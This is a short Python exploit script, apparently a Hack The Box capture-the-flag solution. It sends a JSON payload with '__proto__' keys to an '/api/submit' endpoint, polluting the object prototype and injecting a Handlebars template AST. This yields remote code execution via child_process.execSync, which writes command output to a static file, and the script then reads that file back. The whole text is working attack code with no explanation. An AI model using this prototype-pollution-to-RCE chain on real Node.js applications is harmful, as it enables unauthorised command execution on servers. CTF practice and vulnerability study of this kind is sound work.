import requests

TARGET_URL = 'http://localhost:1337'
# TARGET_URL = 'http://178.62.74.50:31886'
# TARGET_URL = 'http://docker.hackthebox.eu:30894'

# make pollution
r = requests.post(TARGET_URL+'/api/submit', json = {
    "artist.name": "Haigh",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`ls > app/static/out`)"
            # "value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
    })

print(r.request.headers)
print(r.request.body)
print(r.status_code)
print(r.text)

print(requests.get(TARGET_URL+'/static/out').text)
